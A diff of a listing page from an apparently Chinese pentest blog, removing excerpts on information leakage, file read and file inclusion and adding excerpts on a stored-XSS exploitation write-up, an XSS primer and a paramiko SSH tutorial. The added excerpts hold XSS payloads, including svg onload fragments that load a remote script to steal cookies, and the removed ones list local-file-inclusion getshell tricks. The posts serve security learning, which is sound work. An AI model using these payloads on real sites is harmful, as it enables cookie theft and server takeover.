@@ -66,183 +66,6 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
-        <h2><a href="https://wyb0.com/posts/2016/sensitive-information-leakage/">敏感信息泄露</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>
-                    2016-07-28
-                </time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">信息泄露</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 软件敏感信息 * 操作系统版本 可用namp扫描得知 * 中间件的类型、版本 http返回头 404报错页面 使用工具(如whatweb) * Web程序(cms类型及版本、敏感文件) 可用whatweb、cms_identify  0x01 Web敏感信息 * phpinfo()信息泄露 http://[ip]/test.php和http://[ip]/phpinfo.php * 测试页面泄露在外网 test.cgi、phpinfo.php、info.php等 * 编辑器备份文件泄露在外网 http://[ip]/.test.php.swp http://[ip]/test.php.bak http://[ip]/test.jsp.old http://[ip]/cgi~ 常见编辑器备份后缀 * 版本管理工具(如git)文件信息泄露 http://[ip]/.git/config http://[ip]/CVS/Entriesp http://[ip]/.svn/entriesp * HTTP认证泄露漏洞 http://[ip]/basic/index.php Web目录开启了HTTP Basic认证，但未限制IP，导致可暴力破解账号、密码 * 管理后台地址泄露 http://[ip]/login.php http://[ip]/admin.php http://[ip]/manager.php http://[ip]/admin_login.php * 泄露员工邮箱、分机号码 泄露邮箱及分机号码可被社工，也可生成字典 * 错误页面暴漏信息 mysql错误、php错误、暴漏cms版本等 * 探针文件 * robots.txt * phpMyAdmin * 网站源码备份文件(www.rar/sitename.tar.gz/web/zip等) * 其他  0x02 网络信息泄露 * DNS域传送漏洞 * 运维监控系统弱口令、网络拓扑泄露 zabbix弱口令、zabbix sql注入等  0x03 第三方软件应用 * github上源码、数据库、邮箱密码泄露 搜类似：smtp 163 password关键字 * 百度网盘被员工不小心上传敏感文件 * QQ群被员工不小心上传敏感文件  0x04 敏感信息搜集工具 https://github.
-    </p>
-
-    
-    <footer>
-        <a href="/posts/2016/sensitive-information-leakage/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-    </footer>
-    
-</article>
-
-
-            
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="https://wyb0.com/posts/2016/any-file-view-and-download-vulnerability/">任意文件查看与下载漏洞</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>
-                    2016-07-27
-                </time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">信息泄露</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 漏洞介绍 一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞
-0x01 利用条件 * 存在读文件的函数 * 读取文件的路径用户可控且未校验或校验不严 * 输出了文件内容  0x02 漏洞危害 下载服务器任意文件，如脚本代码、服务及系统配置文件等 可用得到的代码进一步代码审计，得到更多可利用漏洞  0x03 任意文件读取 代码形式可如下几种：
-&lt;?php $filename = &quot;test.txt&quot;; readfile($filename); ?&gt; &lt;?php $filename = &quot;test.txt&quot;; $fp = fopen($filename,&quot;r&quot;) or die(&quot;Unable to open file!&quot;); $data = fread($fp,filesize($filename)); fclose($fp); echo &quot;&lt;pre&gt;&quot;; print_r(htmlspecialchars($data)); echo &quot;&lt;/pre&gt;&quot;; ?&gt; &lt;?php $filename = &quot;test.txt&quot;; $data = file_get_contents($filename); echo &quot;&lt;pre&gt;&quot;; print_r(htmlspecialchars($data)); echo &quot;&lt;/pre&gt;&quot;; ?&gt;  0x04 任意文件下载 直接下载：
-&lt;a href=&quot;http://www.xx.com/a.zip&quot;&gt;Download&lt;/a&gt;  用header()下载：
-    </p>
-
-    
-    <footer>
-        <a href="/posts/2016/any-file-view-and-download-vulnerability/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-    </footer>
-    
-</article>
-
-
-            
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="https://wyb0.com/posts/2016/file-include-vulnerabilities/">文件包含漏洞</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>
-                    2016-07-26
-                </time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">文件包含</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        环境：phpStudy 2016、DVWA v1.10
-0x00 文件包含 程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。
-程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。
-几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在PHP Web Application中居多,而在JSP、ASP、ASP.NET程序中却非常少，甚至没有，这是有些语言设计的弊端。
-在PHP中经常出现包含漏洞，但这并不意味这其他语言不存在。
-0x01 常见文件包含函数 include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行 require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本 include_once()和require_once()：若文件中代码已被包含则不会再次包含  0x02 利用条件  程序用include()等文件包含函数通过动态变量的范式引入需要包含的文件 用户能够控制该动态变量  注：PHP中只要文件内容符合PHP语法规范，包含时不管扩展名是什么都会被PHP解析， 若文件内容不符合PHP语法规范则会暴漏其源码。包含不存在的文件则可能暴露路径  0x03 漏洞危害  执行任意代码 读取文件源码或敏感信息 包含恶意文件控制网站 甚至控制服务器  0x04 漏洞分类  本地文件包含：可以包含本地文件，在条件允许时甚至能执行代码  读敏感文件，读PHP文件 包含日志文件GetShell 上传图片马，然后包含从而GetShell 包含/proc/self/envion文件GetShell 包含data:或php://input等伪协议 若有phpinfo则可以包含临时文件  远程文件包含：可以直接执行任意代码  要保证php.ini中allow_url_fopen和allow_url_include要为On   0x05 漏洞挖掘  上AWVS或者自己写代码测试
- 0x06 本地包含GetShell  简单代码示例  &lt;?php if (@$_GET['page']) { include(&quot;./action/&quot;.$_GET['page']); } else { include &quot;.
-    </p>
-
-    
-    <footer>
-        <a href="/posts/2016/file-include-vulnerabilities/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-    </footer>
-    
-</article>
-
-
-            
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
         <h2><a href="https://wyb0.com/posts/2016/code-execution-vulnerabilities/">代码执行漏洞(一)</a></h2>
 
         
@@ -637,6 +460,180 @@ Reference(侵删)：  http://navisec.it/编辑器漏洞手册/
 
 
             
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="https://wyb0.com/posts/2016/recording-an-stored-xss/">一次存储型XSS利用实例</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    2016-07-17
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/xss">xss</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+         首先感谢凯神的指导
+0x00 注册账号 先得到一个临时邮箱，然后注册账号 0x01 找输入输出点 0x02 尝试构造payload payload用如下的即可：
+&lt;script&gt;alert(1)&lt;/script&gt; &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a  但是这个要在点击删除时payload才起作用 也可用&lt;img src=1 onerror=alert(1) /&gt;自动加载，但也要点击删除按钮才能起作用 但是我们若想充分利用则需要远程加载自己的js  0x03 加载自己的js  此时的限制条件为：  * 30个字符 * script标签不能自己触发   只能构造类似下面的语句自己加载脚本：  a=document.createElement('script'); a.src=&quot;www.xxx.com&quot;; document.head.appendChild(a);   可以用如下方法分割，多次添加：  a=document.createE/* */lement('script');/* */a.src=&quot;www.xxx.com&quot;;/* */document.head.app/* */endChild(a); 但此处不可行，考虑直接用JQuery等的函数getScript(URL)直接加载url，然而此处依然不行   查找  构造payload   使用如下payload： &lt;svg/onload=&quot;b='http://t.i'&quot;&gt; &lt;svg/onload=&quot;b+='m/16ap6'&quot;&gt; &lt;svg/onload=&quot;$loadJs(b)&quot;&gt;  0x04 得到Cookie 
+    </p>
+
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="https://wyb0.com/posts/2016/xss-basis-and-use/">XSS漏洞及其挖掘方法</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    2016-07-15
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/xss">xss</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 简介 XSS(跨站脚本攻击)是指攻击者在网页中嵌入客户端脚本，通常是Javascript编写的恶意代码，当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将在用户的浏览器上被解析执行。重点在&rdquo;脚本&rdquo;这两个字上，脚本主要有两个：JavaScript和ActionScript。
+要想深入研究XSS，必须要精通JavaScript，JavaScript能做到什么效果，XSS的威力就有多强大。
+0x01 危害 JavaScript可以用来获取用户Cookie、改变页面内容、URL转跳，那么存在XSS漏洞的网站，就可以盗取用户Cookie、黑掉页面、导航到恶意网站，而攻击者仅仅需要向页面中注入JavaScript代码。
+• 盗取管理员Cookie • XSS Worm • 挂马(水坑攻击) • 键盘记录(有局限性) • 利用网站重定向 • 修改网页内容 • 等等  0x02 攻击场景 在各类SNS、邮件系统、开源流行的Web应用、BBS、微博等社交场景中，前端攻击被广泛实施与关注。主要是一些大型网站才有价值。
+• 支持html解析和javascript解析的客户端,如：html文档、flsh、pdf等 • url的参数，回显到网页上 • form表单提交的内容出现在网页上，如：昵称、邮箱、简介、留言 • 等等  0x03 分类 主要分为三类：反射型、存储型、DOM型(还有flash XSS、mXSS)。
+ 反射型XSS
+  反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。发出请求时，XSS代码出现在URL中，最后输入提交到服务器，服务器解析后在响应内容中出现这段XSS代码，最后浏览器解析执行。
+简单流程： 1. 用户访问带有XSS代码的URL请求 2. 服务器端接收数据后处理，然后返回带有XSS代码的数据发送给浏览器 3. 浏览器解析带有XSS代码的数据后，最终造成XSS漏洞 可能攻击流程： 1. 用户aaa在网站www.xxx.com浏览网页 2. 攻击者hacker发现www.xxx.com/xss.php存在反射型XSS漏洞，然后精心构造JavaScript代码， 3. 构造的代码的功能为盗取用户Cookie并发送到指定站点www.xxser.com 4. hacker将带有反射型XSS漏洞的URL通过站内信发给aaa，站内信为一些诱惑信息，目的是使用户aaa点击 5. 假设用户aaa点击了带有XSS漏洞的URL，则aaa的Cookie将被发送到www.xxser.com 6. hacker获取aaa的Cookie后可以以aaa的身份登陆www.xxx.com，从而得到aaa的敏感信息   存储型XSS
+  存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS，其中最典型的例子就是留言板。
+    </p>
+
+    
+    <footer>
+        <a href="/posts/2016/xss-basis-and-use/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="https://wyb0.com/posts/2016/python-module-paramiko/">Python的paramiko模块</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    2016-07-14
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/python">Python</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/python">python</a>&nbsp;&#47;
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/module">module</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+         0x00 安装 直接pip install paramiko安装
+或者去http://www.paramiko.org/ 下载
+0x01 执行一条远程命令 #!/usr/bin/env python #-*- coding:utf-8 -*- import paramiko #远程执行命令 ssh = paramiko.SSHClient() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ssh.connect(&quot;192.168.188.134&quot;,22,&quot;reber&quot;,&quot;123456&quot;) ssh_session = ssh.get_transport().open_session() stdin,stdout,stderr = ssh.exec_command(&quot;ls -l&quot;) print stdin print stdout.readlines() #返回执行结果 print stderr.readlines() #有错误信息就返回错误信息，没有就返回空 ssh.close()  0x02 上传与下载文件 #!/usr/bin/env python #-*- coding:utf-8 -*- import paramiko ftp = paramiko.Transport((&quot;192.168.188.134&quot;,22)) ftp.connect(username=&quot;reber&quot;,password=&quot;123456&quot;) sftp = paramiko.SFTPClient.from_transport(ftp) #将本地的文件上传到服务端的/tmp/a.txt remotepath='/tmp/a.txt' localpath='C:\\Users\\reber\\Desktop\\a.txt' sftp.put(localpath, remotepath) #将服务端的文件下载到C:\\Users\\reber\\Desktop\\system.log remotepath='/tmp/a.txt' localpath='C:\\Users\\reber\\Desktop\\system.log' sftp.get(remotepath, localpath) ftp.close()  
+    </p>
+
+    
+</article>
+
+
+            
 
             
 
@@ -648,7 +645,7 @@ Reference(侵删)：  http://navisec.it/编辑器漏洞手册/
             <a href="/page/10/"><i class="fa fa-chevron-left"></i></a>
         
 
-        <span>&nbsp;11 / 19&nbsp;</span>
+        <span>&nbsp;11 / 18&nbsp;</span>
         
         
             <a href="/page/12/"><i class="fa fa-chevron-right"></i></a>
@@ -674,7 +671,7 @@ Reference(侵删)：  http://navisec.it/编辑器漏洞手册/
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="https://wyb0.com/topics/git" title="git">git(6)</a>
+                <a href="https://wyb0.com/topics/git" title="git">git(4)</a>
             </li>
         
             <li style="list-style-type:none;">
@@ -684,7 +681,7 @@ Reference(侵删)：  http://navisec.it/编辑器漏洞手册/
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="https://wyb0.com/topics/linux" title="linux">linux(26)</a>
+                <a href="https://wyb0.com/topics/linux" title="linux">linux(25)</a>
             </li>
         
             <li style="list-style-type:none;">
@@ -694,7 +691,7 @@ Reference(侵删)：  http://navisec.it/编辑器漏洞手册/
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="https://wyb0.com/topics/pentest" title="pentest">pentest(83)</a>
+                <a href="https://wyb0.com/topics/pentest" title="pentest">pentest(82)</a>
             </li>
         
             <li style="list-style-type:none;">
@@ -704,7 +701,7 @@ Reference(侵删)：  http://navisec.it/编辑器漏洞手册/
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="https://wyb0.com/topics/python" title="python">python(32)</a>
+                <a href="https://wyb0.com/topics/python" title="python">python(28)</a>
             </li>
         
             <li style="list-style-type:none;">
@@ -714,7 +711,7 @@ Reference(侵删)：  http://navisec.it/编辑器漏洞手册/
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="https://wyb0.com/topics/windows" title="windows">windows(4)</a>
+                <a href="https://wyb0.com/topics/windows" title="windows">windows(2)</a>
             </li>
         
     </ul>
@@ -791,7 +788,7 @@ Reference(侵删)：  http://navisec.it/编辑器漏洞手册/
         
             <p style="display:inline-block;">
                 <a href="https://wyb0.com/tags/git" title="git">git</a>
-                <sup>6</sup>
+                <sup>4</sup>
             </p>
         
             <p style="display:inline-block;">
@@ -816,7 +813,7 @@ Reference(侵删)：  http://navisec.it/编辑器漏洞手册/
         
             <p style="display:inline-block;">
                 <a href="https://wyb0.com/tags/linux" title="linux">linux</a>
-                <sup>11</sup>
+                <sup>10</sup>
             </p>
         
             <p style="display:inline-block;">
@@ -871,7 +868,7 @@ Reference(侵删)：  http://navisec.it/编辑器漏洞手册/
         
             <p style="display:inline-block;">
                 <a href="https://wyb0.com/tags/python" title="python">python</a>
-                <sup>30</sup>
+                <sup>26</sup>
             </p>
         
             <p style="display:inline-block;">
@@ -917,11 +914,6 @@ Reference(侵删)：  http://navisec.it/编辑器漏洞手册/
             <p style="display:inline-block;">
                 <a href="https://wyb0.com/tags/tools" title="tools">tools</a>
                 <sup>11</sup>
-            </p>
-        
-            <p style="display:inline-block;">
-                <a href="https://wyb0.com/tags/tornado" title="tornado">tornado</a>
-                <sup>1</sup>
             </p>
         
             <p style="display:inline-block;">
@@ -1011,7 +1003,7 @@ Reference(侵删)：  http://navisec.it/编辑器漏洞手册/
         
             <p style="display:inline-block;">
                 <a href="https://wyb0.com/tags/%e9%92%93%e9%b1%bc" title="钓鱼">钓鱼</a>
-                <sup>2</sup>
+                <sup>1</sup>
             </p>
         
     </div>
